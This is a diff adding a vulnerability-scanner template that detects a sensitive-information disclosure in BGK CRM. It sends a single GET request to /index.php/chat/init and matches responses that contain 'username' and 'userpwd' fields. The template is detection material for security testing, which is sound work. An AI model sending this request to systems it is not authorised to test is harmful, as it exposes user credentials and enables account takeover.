@@ -1,0 +1,36 @@
+id: bgk-crm-info-disclosure
+info:
+  name: BGK CRM Sensitive Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    BGK CRM is a customer management system that integrates customer files, sales records, business contacts, and other functions. This template detects sensitive information disclosure vulnerability in BGK CRM, allowing attackers to read sensitive system information through specific URL addresses.
+  reference:
+    - https://www.bgkcrm.com/
+  classification:
+    cvss-score: 9.0
+  tags: information_disclosure
+
+http:
+  - raw:
+      - |
+        GET /index.php/chat/init HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "\"code\":0"
+        part: body
+      - type: word
+        words:
+          - "username"
+        part: body
+      - type: word
+        words:
+          - "userpwd"
+        part: body
